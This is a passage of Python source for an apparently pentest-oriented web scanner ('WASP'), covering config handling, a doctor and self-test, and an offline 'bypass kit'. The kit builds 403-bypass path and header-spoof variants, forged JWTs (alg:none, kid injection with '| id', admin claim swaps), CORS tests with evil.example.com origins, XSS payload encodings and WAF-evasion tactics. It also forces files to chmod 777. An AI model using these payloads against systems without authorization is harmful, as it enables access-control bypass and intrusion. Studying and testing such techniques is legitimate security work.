        cfg = _core.Cfg(None)                      # defaults se start
        for k, v in self.flat.items():
            if k == "meta" or k in ENGINE_BLOCKS:
                continue
            cfg.data[k] = v
            try:
                setattr(cfg, k, v)
            except Exception:
                pass
        cfg.data["profile"] = str(self.flat.get("profile", "balanced"))
        setattr(cfg, "profile", cfg.data["profile"])
        if self.report.get("enforced"):
            for w in self.report["enforced"]:
                warn("ENFORCED: %s" % w)
        return cfg

    def save(self, path):
        return save_json_rwx(path, self.raw)


# ---------------------------------------------------------------------------
# BYPASS KIT GENERATORS (100% OFFLINE - koi request nahi jati, tables banti hain)
# ---------------------------------------------------------------------------
DEFAULT_BYPASS_KIT = {
    "path_variants": [
        "/{p}", "/{p}/", "/{p}/.", "//{p}", "/./{p}", "/%2e/{p}",
        "/{P}", "/{p}..;/", "/{p};/", "/{p}/..;/{p}", "/{p}%20",
        "/{p}%09", "/{p}.json", "/{p};.js", "/api/{p}", "/%2f{p}", "/{p}%2f",
    ],
    "ip_headers": [
        {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-For": "10.0.0.1"},
        {"X-Real-IP": "127.0.0.1"}, {"True-Client-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"}, {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"}, {"X-Host": "localhost"},
        {"X-Original-URL": "/{p}"}, {"X-Rewrite-URL": "/{p}"},
    ],
    "method_override_headers": [
        {"X-HTTP-Method-Override": "GET"}, {"X-Method-Override": "GET"},
        {"X-HTTP-Method": "GET"},
    ],
    "encoding_layers": ["url", "double_url", "unicode", "html_entity", "base64", "hex"],
    "cors_origins": [
        "null", "https://evil.example.com", "https://{host}.evil.example.com",
        "https://evil-{host}.example.com",
    ],
    "verb_tamper_methods": ["HEAD", "OPTIONS", "PATCH", "TRACE"],
    "jwt": {
        "alg_none": True, "kid_injection": True,
        "kid_payloads": ["../../dev/null", "| id",
                         "x\", \"alg\": \"none\", \"kid\": \"x"],
        "claim_swap": True, "swap_role_to": "admin", "weak_secret_wordlist": None,
    },
}


def _kit_data(uc):
    kit = dict(DEFAULT_BYPASS_KIT)
    kit.update({k: v for k, v in (uc.get("bypass_kit") or {}).items() if not k.startswith("_")})
    return kit


def kit_403(uc, target):
    """403/401 bypass variant table banate hain - OFFLINE. target = path ya full URL."""
    kit = _kit_data(uc)
    p = target.strip()
    url = None
    if "://" in p:
        u = urllib.parse.urlsplit(p)
        url = "%s://%s" % (u.scheme, u.netloc)
        p = u.path or "/"
    p = ("/" + p.lstrip("/")).rstrip() or "/"
    if p == "/":
        p = "/admin"  # demo default
    fam = []
    if uc.get("bypass_path_variants", True):
        for v in kit["path_variants"]:
            fam.append(("path", "GET", v.replace("{p}", p).replace("{P}", p.lstrip("/").capitalize()),
                        None))
    if uc.get("bypass_case_toggle", True):
        fam.append(("case", "GET", p.upper(), None))
        fam.append(("case", "GET", p.capitalize(), None))
    if uc.get("bypass_header_spoof", True) or uc.get("bypass_ip_headers", True):
        for h in kit["ip_headers"]:
            hh = {k: v.replace("{p}", p) for k, v in h.items()}
            fam.append(("header", "GET", p, hh))
    if uc.get("bypass_method_override", True):
        for h in kit["method_override_headers"]:
            fam.append(("override", "GET", p, h))
    if uc.get("bypass_verb_tamper", True):
        for m in kit["verb_tamper_methods"]:
            if ":" not in m:
                fam.append(("verb", m, p, None))
    if uc.get("bypass_suffix_tricks", True):
        fam.append(("suffix", "GET", p + ".json", None))
        fam.append(("suffix", "GET", p + ";.js", None))
    cap = int(uc.get("bypass_max_probes", 60) or 0)
    rows = []
    if cap > 0:
        for i, (fam_name, m, path, hdrs) in enumerate(fam[:cap]):
            rows.append({"#": i + 1, "family": fam_name, "method": m,
                         "url": (url + path) if url else path,
                         "headers": hdrs or {}})
    return rows


def _b64u(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _b64u_decode(seg):
    pad = "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg + pad).decode("utf-8", "replace"))


def kit_jwt(uc, token):
    """JWT attack kit - decode + alg:none + kid injection + claim swap (NO verify, NO network)."""
    if uc.get("bypass_jwt_attacks") is False:
        return {"skipped": "bypass_jwt_attacks=false"}
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"error": "JWT format <header>.<payload>.<sig> chahiye (%d parts mile)" % len(parts)}
    try:
        header, payload = _b64u_decode(parts[0]), _b64u_decode(parts[1])
    except Exception as e:
        return {"error": "decode fail: %s" % e}
    attacks = []
    kid_cfg = (uc.get("bypass_kit") or {}).get("jwt") or DEFAULT_BYPASS_KIT.get("jwt") or {}

    def _sign_none(h, pl):
        return "%s.%s." % (_b64u(h), _b64u(pl))

    if kid_cfg.get("alg_none", True):
        h2 = dict(header); h2["alg"] = "none"
        attacks.append({"attack": "alg:none", "token": _sign_none(h2, payload)})
        h3 = dict(header); h3["alg"] = "None"
        attacks.append({"attack": "alg:None (case)", "token": _sign_none(h3, payload)})
    if kid_cfg.get("kid_injection", True):
        for kid in kid_cfg.get("kid_payloads") or []:
            h2 = dict(header); h2["alg"] = "HS256"; h2["kid"] = kid
            attacks.append({"attack": "kid-injection %s" % kid[:24],
                            "token": _sign_none(h2, payload) + "AA",
                            "note": "HS256 + attacker-controlled kid -> empty/known secret se sign karo"})
    if kid_cfg.get("claim_swap", True):
        role = kid_cfg.get("swap_role_to", "admin")
        for field in ("role", "admin", "is_admin", "privilege", "user_role", "scope"):
            if field in payload:
                pl2 = dict(payload)
                pl2[field] = role if field != "scope" else (" ".join([role, "read", "write"])
                                                            if isinstance(payload[field], str) else role)
                attacks.append({"attack": "claim-swap %s=%s" % (field, pl2[field]),
                                "token": _sign_none(dict(header, alg="none"), pl2)})
        if not any(a["attack"].startswith("claim-swap") for a in attacks):
            pl2 = dict(payload); pl2["role"] = kid_cfg.get("swap_role_to", "admin")
            attacks.append({"attack": "claim-inject role=admin (field tha hi nahi)",
                            "token": _sign_none(dict(header, alg="none"), pl2)})
    plx = dict(payload)
    plx["exp"] = int(plx.get("exp", 0) or 0) + 315360000 if plx.get("exp") else 4102444800
    attacks.append({"attack": "exp+10y (expired token revive)",
                    "token": _sign_none(dict(header, alg="none"), plx)})
    return {"header": header, "payload": {k: ("***" if k in ("password", "secret") else v)
                                         for k, v in payload.items()},
            "attacks": attacks}


def kit_cors(uc, host):
    kit = _kit_data(uc)
    rows = []
    for o in kit["cors_origins"]:
        rows.append({"origin_header": o.replace("{host}", host),
                     "send_with": "GET (read-only)", "look_for": "Access-Control-Allow-Credentials: true"})
    return rows


def kit_encode(uc, payload):
    kit = _kit_data(uc)
    out = {}
    for layer in kit["encoding_layers"]:
        if layer == "url":
            out["url"] = urllib.parse.quote(payload, safe="")
        elif layer == "double_url":
            out["double_url"] = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        elif layer == "unicode":
            out["unicode"] = "".join("%%u%04x" % ord(c) for c in payload)
        elif layer == "html_entity":
            out["html_entity"] = "".join("&#x%x;" % ord(c) for c in payload)
        elif layer == "base64":
            out["base64"] = base64.b64encode(payload.encode()).decode("ascii")
        elif layer == "hex":
            out["hex"] = "0x" + binascii.hexlify(payload.encode()).decode("ascii")
    return out


def kit_ratelimit(uc):
    """Rate-limit/WAFNoise se bachne ka OFFLINE playbook (read-only)."""
    return [
        {"tactic": "jitter on rate", "config": "jitter=0.55 (stealth/ghost already)"},
        {"tactic": "UA rotation", "config": "rotate_user_agents=true + ua_rotate_every=25"},
        {"tactic": "adaptive throttle", "config": "adaptive_throttle=true (429/WAF par auto-slow)"},
        {"tactic": "negative cache", "config": "negative_cache=true (dead targets retry nahi)"},
        {"tactic": "XFF rotation (WAF IP-pinning)", "config": "bypass_ip_headers=true (kit_403 me sets)"},
        {"tactic": "method mix", "config": "HEAD/OPTIONS free methods use karo jab ho sake"},
        {"tactic": "per-phase budgets", "config": "tech_probe_max/content_* caps (har phase apna cap)"},
        {"tactic": "ghost mode", "config": "profile=ghost -> rate 0.8, concurrency 1, bypass off"},
    ]


# ---------------------------------------------------------------------------
# DOCTOR (~15 checks, --fix repair)
# ---------------------------------------------------------------------------
def doctor(path, fix=False, core_dir=None):
    results = []
    bad = 0

    def rec(name, okflag, detail):
        nonlocal bad
        results.append((name, okflag, detail))
        if not okflag:
            bad += 1

    head("WASP CONFIG DOCTOR - %s" % (path or "defaults"))
    # 1) parse
    try:
        uc = UltraConfig(path)
        rec("config parse", True, uc.path or "defaults (%d keys)" % len(uc.flat))
    except Exception as e:
        rec("config parse", False, str(e))
        for n, o, d in results:
            print("  [%s] %-28s %s" % ("OK" if o else "!!", n, d))
        return 1
    # 2) validation
    for e in uc.errors:
        rec("validate", False, e)
    for w in uc.warnings:
        warn("W: %s" % w)
    if not uc.errors:
        rec("validate", True, "%d flat keys, %d mirrors, %d enforcement notes"
            % (len(uc.flat), len(uc.report["mirrors"]), len(uc.report["enforced"])))
    # 3) security posture
    po = uc.posture
    rec("layer4 read-only", po["read_only"] == list(LAYER4_METHODS) and not po["allow_write_http"],
        "methods=%s allow_write=%s" % (po["read_only"], po["allow_write_http"]))
    rec("write-probe gates", not po["write_probes_p11"] and not po["destructive"],
        "P11 write=%s destructive=%s" % (po["write_probes_p11"], po["destructive"]))
    rec("rwx standing rule", po["results_rwx"], "results_rwx=%s" % po["results_rwx"])
    # 4) contract coverage
    missing = [k for k in CONTRACT if k not in uc.flat]
    rec("contract coverage", not missing,
        ("%d/%d keys present" % (len(CONTRACT), len(CONTRACT)) if not missing
         else "missing: %s (fix: upgrade)" % ", ".join(missing[:6])))
    # 5) scope.json
    sdir = os.path.dirname(uc.path) if uc.path else "."
    sp = os.path.join(sdir, "scope.json")
    if os.path.exists(sp):
        try:
            sraw = load_json(sp)
            good = bool(sraw.get("authorized")) and bool(sraw.get("targets") or sraw.get("domains")
                                                        or sraw.get("ips"))
            ref = str(sraw.get("authorization_reference", ""))
            ph = (not ref) or ref.upper().startswith("REPLACE")
            rec("scope.json", good and not ph,
                "authorized=%s targets=%s%s" % (sraw.get("authorized"), len(sraw.get("targets") or []),
                                                " + placeholder-ref" if ph else ""))
        except Exception as e:
            rec("scope.json", False, "parse fail: %s" % e)
    else:
        rec("scope.json", False, "nahi mila (%s) - wizard chalao" % sp)
    # 6) RWX sweep
    base = uc.flat.get("results_base", "engines")
    rdir = os.path.join(sdir, base) if base and not os.path.isabs(base) else base
    if uc.path:
        rdir = os.path.join(sdir, base)
    if os.path.isdir(rdir):
        nb = _non777_count(rdir)
        if nb and fix:
            st = {"fixed": 0}
            _rwx_tree(rdir, st)
            nb = _non777_count(rdir)
            ok("RWX fix: %d entries repair -> ab non-777: %d" % (st["fixed"], len(nb)))
        rec("rwx results tree", not nb, "%s non-777 (%s)" % (len(nb), base))
    else:
        rec("rwx results tree", True, "%s abhi exist nahi (run ke baad check hoga)" % base)
    # 7) config file permission
    if uc.path:
        if oct(os.stat(uc.path).st_mode & 0o777) != "0o777" and fix:
            _rwx_result(uc.path)
        now777 = oct(os.stat(uc.path).st_mode & 0o777) == "0o777"
        rec("config file 0777", now777,
            "rwxrwxrwx" if now777 else "chmod 777 karo (--fix)")
    # 8) core + mods presence
    corep = None
    for c in (os.path.join(sdir, "wasp_core.py"), os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "wasp_core.py")):
        if os.path.exists(c):
            corep = c
            break
    rec("wasp_core.py", bool(corep), corep or "pack me nahi mila")
    mods = sorted(m for m in os.listdir(sdir) if m.startswith("mod_") and m.endswith(".py")) \
        if os.path.isdir(sdir) else []
    rec("mod_ files", len(mods) >= 5, "%d mods: %s" % (len(mods), ", ".join(
        m[4:-3] for m in mods[:8])) if mods else "0 (sirf config mode chalega)")
    # 9) Cfg integration
    if corep:
        try:
            cfg = uc.make_cfg(core_dir=os.path.dirname(corep))
            probe = all(getattr(cfg, k, CONTRACT[k][1]) == uc.flat.get(k, CONTRACT[k][1])
                        for k in ("rate_limit", "max_requests", "tech_probe_max", "access_sim_confirm"))
            rec("Cfg integration", probe, "wasp_core.Cfg me %d keys inject ho gayi" % len(uc.flat))
        except Exception as e:
            rec("Cfg integration", False, str(e))
    # 10) env
    rec("python", sys.version_info >= (3, 8), sys.version.split()[0])
    # print
    for n, o, d in results:
        print("  [%s%s%s] %s%-30s%s %s" % (C_G if o else C_R, "OK" if o else "!!", C_N,
                                           C_B, n, C_N, d))
    print("\n  posture: profile=%s | bypass=%s(%d) | write_http=%s | destructive=%s"
          % (po["profile"], po["bypass_enabled"], po["bypass_budget"],
             po["allow_write_http"], po["destructive"]))
    if bad == 0:
        ok("DOCTOR: SAB GREEN (%d checks)" % len(results))
        return 0
    err("DOCTOR: %d/%d checks fail" % (bad, len(results)))
    if not fix:
        info("auto-repair ke liye: python3 %s doctor %s --fix" % (ENGINE, path or "config.json"))
    return 1


# ---------------------------------------------------------------------------
# DEFAULT MEGA CONFIG BUILDER (init command ka source)
# ---------------------------------------------------------------------------
DEFAULT_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


def build_default_mega():
    flat = {k: copy.deepcopy(d) for k, (t, d) in CONTRACT.items()
            if k not in ("user_agent", "user_agents", "content_wordlist_file")}
    flat["user_agent"] = DEFAULT_UA_POOL[4].replace(" Edg/124.0.0.0", "")
    flat["user_agents"] = list(DEFAULT_UA_POOL)
    flat["content_wordlist_file"] = None
    flat["resolvers"] = ["1.1.1.1", "8.8.8.8"]
    flat["pipeline_order"] = ["understand", "passive", "active", "content", "tech",
                              "js", "surface", "access"]
    mega = {
        "_GUIDE": {
            "what": "WASP ULTRA MASTER CONFIG - har phase ek hi file se control",
            "how": "is file ko wasp.py ke bagal me config.json naam se rakho, ya "
                   "python3 wasp_config.py doctor/profile/bypass ... chalao",
            "explain": "python3 wasp_config.py explain [key]",
        },
        "_meta": {"name": "WASP-ULTRA-MASTER", "version": __version__,
                  "generated_by": ENGINE},
        "security_model": {
            "read_only_methods": list(LAYER4_METHODS),
            "allow_write_http": False, "i_confirm_write_http": False,
            "results_rwx": True, "results_base": "engines",
            "pii_redact": True, "secrets_redact": True, "scope_file": "scope.json",
            "respect_robots": False, "allow_destructive": False,
        },
        "profiles": {p: dict(v) for p, v in PROFILES_ULTRA.items()},
        "bypass_kit": copy.deepcopy(DEFAULT_BYPASS_KIT),
        "auth": {"mode": "none", "cookie_header": "", "bearer_token": "",
                 "basic_user": "", "basic_pass": "", "header_name": "", "header_value": ""},
        "wordlists": {"content_extra": None, "secrets": None, "params": None,
                      "subdomains": None},
        "reporting": {"engagement_name": "", "report_title": "WASP ULTRA Engagement Report",
                      "min_severity": "info", "show_filtered_findings": True},
    }
    mega.update(flat)
    return mega


# ---------------------------------------------------------------------------
# CLI COMMANDS
# ---------------------------------------------------------------------------
def cmd_init(args):
    path = args.config or "config.json"
    head("WASP CONFIG INIT -> %s" % path)
    if os.path.exists(path) and not args.force:
        err("%s already hai - overwrite se bachne ke liye --force do" % path)
        return 2
    mega = build_default_mega()
    save_json_rwx(path, mega)
    ok("mega config likh diya: %s (%d keys)" % (path, len(mega)))
    info("agla step: python3 %s doctor %s" % (ENGINE, path))
    return 0


def cmd_validate(args):
    try:
        uc = UltraConfig(args.config)
    except Exception as e:
        err("config load fail: %s" % e)
        return 2
    head("VALIDATE - %s" % (uc.path or "defaults"))
    info("%d flat keys | %d mirrors | %d enforcement" % (
        len(uc.flat), len(uc.report["mirrors"]), len(uc.report["enforced"])))
    for m in uc.report["mirrors"]:
        dim_line("mirror: %s" % m)
    for n in uc.report["enforced"]:
        warn("enforced: %s" % n)
    for w in uc.warnings:
        warn("W: %s" % w)
    if uc.errors:
        for e in uc.errors:
            err("E: %s" % e)
        err("VALIDATION FAIL: %d errors" % len(uc.errors))
        return 1
    ok("VALIDATION PASS (0 errors, %d warnings)" % len(uc.warnings))
    return 0


def dim_line(m):
    print("  %s%s%s" % (C_D, m, C_N))


def cmd_show(args):
    try:
        uc = UltraConfig(args.config)
    except Exception as e:
        err("config load fail: %s" % e)
        return 2
    head("WASP CONFIG SHOW")
    po = uc.posture
    rows = [
        ["profile", po["profile"]], ["read-only methods", ", ".join(po["read_only"])],
        ["allow_write_http", str(po["allow_write_http"])],
        ["write probes (P11)", str(po["write_probes_p11"])],
        ["destructive", str(po["destructive"])],
        ["results rwx", str(po["results_rwx"])],
        ["bypass engines", "%s (budget %d/target)" % (po["bypass_enabled"], po["bypass_budget"])],
        ["rate_limit / jitter", "%s / %s" % (uc.get("rate_limit"), uc.get("jitter"))],
        ["concurrency / timeout", "%s / %s" % (uc.get("concurrency"), uc.get("timeout"))],
        ["max_requests", str(uc.get("max_requests"))],
        ["pipeline order", " -> ".join(uc.get("pipeline_order") or sorted(PHASE_KEYS))],
    ]
    for ph in sorted(PHASE_KEYS):
        pv = uc.phase(ph)
        on = pv.get("%s_enabled" % ph, True)
        budgets = ", ".join("%s=%s" % (k.split("_", 1)[1], v) for k, v in sorted(pv.items())
                            if isinstance(v, int) and (v > 8 or v in (0,)) and "enabled" not in k)
        rows.append(["%s %s" % (MODULE_ALIAS[ph], ph),
                     "ON " if on else "OFF", budgets[:60]])
    wcol = max(len(str(r[0])) for r in rows)
    for r in rows:
        print("  %s%-*s%s : %s" % (C_B, wcol, r[0], C_N, r[1] if len(r) == 2
                                   else "%s  %s" % (r[1], r[2])))
    if uc.errors:
        err("%d validation errors - `validate` chalao" % len(uc.errors))
        return 1
    ok("config healthy")
    return 0


def cmd_explain(args):
    head("CONFIG EXPLAIN (Hinglish)")
    if args.key:
        k = args.key.strip()
        if k in CONFIG_DOCS:
            d = CONTRACT.get(k)
            print("  %s%s%s\n    type: %s | default: %s\n    %s"
                  % (C_B, k, C_N, d[0] if d else "?", d[1] if d else "?", CONFIG_DOCS[k]))
            return 0
        hits = [c for c in CONFIG_DOCS if k in c]
        if hits:
            for h in hits[:20]:
                print("  %s%s%s - %s" % (C_C, h, C_N, CONFIG_DOCS[h]))
            return 0
        err("key nahi mili: %s" % k)
        return 1
    groups = [("CORE", lambda k: k in ("rate_limit", "jitter", "concurrency", "timeout",
                                       "retries", "backoff", "max_requests", "redirects",
                                       "verify_tls", "proxy", "user_agent", "rotate_user_agents",
                                       "accept_encoding", "custom_headers", "retry_status",
                                       "adaptive_throttle", "negative_cache", "resolvers")),
              ("SECURITY", lambda k: k in ("allow_active", "allow_destructive", "allow_write_http",
                                           "results_rwx", "results_base", "pii_redact",
                                           "secrets_redact", "respect_robots", "profile")),
              ("BYPASS", lambda k: k.startswith("bypass_") or k == "stealth_evasion"),
              ("P2 understand", lambda k: k.startswith("understand_")),
              ("P3 passive", lambda k: k.startswith("passive_")),
              ("P4 active", lambda k: k.startswith("active_")),
              ("P5 content", lambda k: k.startswith("content_")),
              ("P6 tech", lambda k: k.startswith("tech_")),
              ("P7 js", lambda k: k.startswith("js_")),
              ("P8 surface", lambda k: k.startswith("surface_")),
              ("P11 access", lambda k: k.startswith("access_"))]
    for gname, pred in groups:
        print("\n  %s%s%s" % (C_B, gname, C_N))
        for k in CONFIG_DOCS:
            if pred(k):
                print("    %s%-32s%s %s" % (C_C, k, C_N, CONFIG_DOCS[k]))
    print("\n  total %d documented keys | details: explain <key>" % len(CONFIG_DOCS))
    return 0


def cmd_profile(args):
    path = args.config or "config.json"
    head("WASP PROFILE -> %s" % path)
    if not os.path.exists(path):
        err("%s nahi mila - pehle init chalao" % path)
        return 2
    data = load_json(path)
    changed = apply_profile(data, args.name)
    if changed is None:
        err("profile '%s' invalid - options: %s" % (args.name, ", ".join(VALID_PROFILES)))
        return 1
    if os.path.exists(path):
        bak = path + ".bak-" + str(int(__import__("time").time()))
        shutil.copy2(path, bak)
        info("backup: %s" % bak)
    save_json_rwx(path, data)
    ok("profile '%s' applied -> %d flat keys change hui" % (args.name, len(changed)))
    dim_line(", ".join(changed) if changed else "(already in sync)")
    info("ab HAR phase ye tuning use karega (wasp.py run --module <name>)")
    return 0


def cmd_bypass(args):
    try:
        uc = UltraConfig(args.config)
    except Exception as e:
        err("config load fail: %s" % e)
        return 2
    kind = args.kind
    head("BYPASS KIT [%s] - OFFLINE generator (0 requests bheje gaye)" % kind)
    if not uc.get("bypass_enabled", True) and kind != "encode":
        warn("bypass_enabled=false hai - kit sirf reference ke liye (budget 0)")
    out = None
    if kind == "403":
        if not args.target:
            err("target path/URL do: bypass 403 /admin")
            return 2
        out = kit_403(uc, args.target)
        if not out:
            warn("0 rows - bypass_max_probes=0 (budget off) ya koi family off hai")
        for r in out:
            hh = "; ".join("%s: %s" % (k, v) for k, v in (r["headers"] or {}).items())
            print("  %-3s %-9s %-6s %-42s %s" % (r["#"], r["family"], r["method"],
                                                 str(r["url"])[:42], hh))
        info("fire karne ke liye: existing read-only HttpClient/scope se GET bhejo "
             "(double-confirm on hai to hit dobara verify hoga)")
    elif kind == "jwt":
        if not args.target:
            err("token do: bypass jwt eyJhbGci...")
            return 2
        out = kit_jwt(uc, args.target)
        if out.get("error"):
            err(out["error"])
            return 1
        info("header : %s" % json.dumps(out["header"]))
        info("payload: %s" % json.dumps(out["payload"]))
        for a in out["attacks"]:
            print("  %s[%s]%s %s\n        %s" % (C_Y, a["attack"], C_N,
                                                 a.get("note", ""), a["token"][:110]))
    elif kind == "cors":
        host = args.target or "target.example.com"
        out = kit_cors(uc, host)
        for r in out:
            print("  Origin: %-44s %s | %s" % (r["origin_header"], r["send_with"],
                                               r["look_for"]))
    elif kind == "encode":
        if not args.target:
            err("payload do: bypass encode \"<script>alert(1)</script>\"")
            return 2
        out = kit_encode(uc, args.target)
        for k, v in out.items():
            print("  %-11s %s" % (k, v[:120]))
    elif kind == "ratelimit":
        out = kit_ratelimit(uc)
        for r in out:
            print("  %-28s %s" % (r["tactic"], r["config"]))
    else:
        err("kind: 403|jwt|cors|encode|ratelimit")
        return 2
    # kit save (RWX)
    if args.save and out is not None:
        sdir = os.path.dirname(os.path.abspath(uc.path)) if uc.path else "."
        sp = os.path.join(sdir, "bypass_kit_%s_%s.json" % (kind, args.target.replace(
            "/", "_")[:30] if args.target else "gen"))
        save_json_rwx(sp, {"kind": kind, "generated": True, "offline": True, "rows": out})
        ok("kit saved (rwx): %s" % sp)
    return 0


def cmd_upgrade(args):
    path = args.config or "config.json"
    head("WASP CONFIG UPGRADE -> %s" % path)
    if not os.path.exists(path):
        err("%s nahi mila" % path)
        return 2
    data = load_json(path)
    if not isinstance(data, dict):
        err("config root object nahi hai")
        return 1
    added = [k for k in CONTRACT if k not in data]
    for k in added:
        data[k] = copy.deepcopy(CONTRACT[k][1])
    if "pipeline_order" in added:
        data["pipeline_order"] = ["understand", "passive", "active", "content", "tech",
                                  "js", "surface", "access"]
    if "user_agents" in added:
        data["user_agents"] = list(DEFAULT_UA_POOL)
    bak = path + ".bak-" + str(int(__import__("time").time()))
    shutil.copy2(path, bak)
    save_json_rwx(path, data)
    ok("upgrade done: %d naye keys add hue (user values UNTOUCHED), backup: %s"
       % (len(added), bak))
    if added:
        dim_line(", ".join(added))
    return 0


def cmd_diff(args):
    head("CONFIG DIFF")
    try:
        a = UltraConfig(args.config).flat
        b = UltraConfig(args.config2).flat
    except Exception as e:
        err("load fail: %s" % e)
        return 2
    keys = sorted(set(a) | set(b))
    n = 0
    for k in keys:
        va, vb = a.get(k, "<absent>"), b.get(k, "<absent>")
        if va != vb and k != "meta":
            n += 1
            print("  %s%-32s%s A=%s | B=%s" % (C_Y, k, C_N, str(va)[:40], str(vb)[:40]))
    ok("%d keys differ" % n)
    return 0


# ---------------------------------------------------------------------------
# SELFTEST (engine internal - no network, no mods needed)
# ---------------------------------------------------------------------------
def cmd_selftest(args):
    head("WASP CONFIG ENGINE SELFTEST")
    passed = failed = 0

    def chk(name, cond):
        nonlocal passed, failed
        if cond:
            passed += 1
            ok(name)
        else:
            failed += 1
            err(name)

    mega = build_default_mega()
    chk("build_default_mega: %d keys" % len(mega), len(mega) > 90)
    uc = UltraConfig(None)
    uc.raw = copy.deepcopy(mega)
    uc.flat = flatten(dict(uc.raw, __path__=None), uc.report)
    uc.errors, uc.warnings = validate(uc.flat)
    chk("fresh config 0 errors", not uc.errors)
    chk("contract coverage 100%", not [k for k in CONTRACT if k not in uc.flat])
    chk("phase views 8 modules", len(PHASE_KEYS) == 8 and all(uc.phase(m) for m in PHASE_KEYS))
    # security enforcement
    t = copy.deepcopy(mega)
    t["allow_write_http"] = True
    rf = flatten(copy.deepcopy(t))
    chk("write_http force-false (no confirm)", rf.get("allow_write_http") is False)
    t2 = copy.deepcopy(mega)
    t2["allow_write_http"] = True
    t2.setdefault("security_model", {})["i_confirm_write_http"] = True
    rf2 = flatten(copy.deepcopy(t2))
    chk("write_http pass with confirm", rf2.get("allow_write_http") is True)
    try:
        flatten(dict(copy.deepcopy(mega), security_model={"read_only_methods": ["GET", "POST"]}))
        chk("read-only tamper raise", False)
    except ValueError:
        chk("read-only tamper raise", True)
    # auth mirror
    t3 = copy.deepcopy(mega)
    t3["auth"] = {"mode": "bearer", "bearer_token": "abc.def.ghi"}
    rf3 = flatten(copy.deepcopy(t3))
    chk("auth bearer mirror", rf3.get("custom_headers", {}).get("Authorization") == "Bearer abc.def.ghi")
    t4 = copy.deepcopy(mega)
    t4["wordlists"] = {"content_extra": "wl.txt"}
    rf4 = flatten(copy.deepcopy(t4))
    chk("wordlist mirror", rf4.get("content_wordlist_file") == "wl.txt")
    # profiles
    t5 = copy.deepcopy(mega)
    ch = apply_profile(t5, "ghost")
    chk("ghost apply (rate 0.8, bypass off)", t5.get("rate_limit") == 0.8
        and t5.get("bypass_enabled") is False and ch is not None)
    chk("profile invalid -> None", apply_profile(dict(mega), "nope") is None)
    # validation catches
    t6 = copy.deepcopy(mega)
    t6["rate_limit"] = -5
    t6["access_sim_confirm"] = 0.5
    t6["access_sim_suspect"] = 0.9
    e6, _w6 = validate(flatten(copy.deepcopy(t6)))
    chk("validate catches bad rate+thresholds", len(e6) >= 2)
    # bypass kits
    rows = kit_403(UltraConfig(None), "https://demo.example.com/admin")
    chk("kit_403 rows>0 + no network", len(rows) >= 20 and all(
        r["method"] in ("GET", "HEAD", "OPTIONS", "PATCH", "TRACE") for r in rows))
    tok = "%s.%s.%s" % (_b64u({"alg": "HS256", "typ": "JWT"}),
                        _b64u({"sub": "1", "role": "user", "exp": 1700000000}), "sig")
    jk = kit_jwt(UltraConfig(None), tok)
    chk("kit_jwt attacks>0 (alg-none+kid+swap)", len(jk.get("attacks", [])) >= 5)
    enc = kit_encode(UltraConfig(None), "<svg onload=alert(1)>")
    chk("kit_encode 6 layers", len(enc) == 6)
    chk("kit_ratelimit rows", len(kit_ratelimit(UltraConfig(None))) >= 6)
    # rwx
    import tempfile
    td = tempfile.mkdtemp(prefix="wasp_cfg_st_")
    fp = os.path.join(td, "out.json")
    save_json_rwx(fp, {"a": 1})
    chk("save_json_rwx 0777", oct(os.stat(fp).st_mode & 0o777) == "0o777")
    shutil.rmtree(td, ignore_errors=True)
    print("\n  %s%d PASS / %d FAIL%s" % (C_G if not failed else C_R, passed, failed, C_N))
    return 0 if not failed else 1


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(prog=ENGINE,
                                 description="WASP ULTRA CONFIG ENGINE - har phase ek config se")
    ap.add_argument("--config", default=None, help="config.json path")
    sub = ap.add_subparsers(dest="cmd")

    sub.add_parser("init", help="mega config.json likho")
    p = sub.add_parser("validate", help="schema + security validate")
    p.add_argument("cpath", nargs="?", default=None, help="config.json path")
    p = sub.add_parser("show", help="readable summary")
    p.add_argument("cpath", nargs="?", default=None, help="config.json path")
    p = sub.add_parser("explain", help="key ka matlab (Hinglish)")
    p.add_argument("key", nargs="?", default=None)
    p = sub.add_parser("profile", help="ULTRA profile flat keys me likho")
    p.add_argument("name", choices=list(VALID_PROFILES))
    p.add_argument("cpath", nargs="?", default=None, help="config.json path")
    p = sub.add_parser("doctor", help="sanity checks")
    p.add_argument("cpath", nargs="?", default=None, help="config.json path")
    p.add_argument("--fix", action="store_true", help="auto-repair (RWX etc.)")
    p = sub.add_parser("bypass", help="OFFLINE attack kit generator")
    p.add_argument("kind", choices=["403", "jwt", "cors", "encode", "ratelimit"])
    p.add_argument("target", nargs="?", default=None, help="path/URL/token/payload/host")
    p.add_argument("--save", action="store_true", help="kit ko bypass_kit_*.json me save karo (rwx)")
    p = sub.add_parser("upgrade", help="naye contract keys add karo (values untouched)")
    p.add_argument("cpath", nargs="?", default=None, help="config.json path")
    p = sub.add_parser("diff", help="do configs compare")
    p.add_argument("cpath", nargs="?", default=None, help="pehla config path")
    p.add_argument("config2", help="doosra config path")
    p = sub.add_parser("selftest", help="engine internal checks")
    p = sub.add_parser("flatten", help="runtime flat keyspace print")
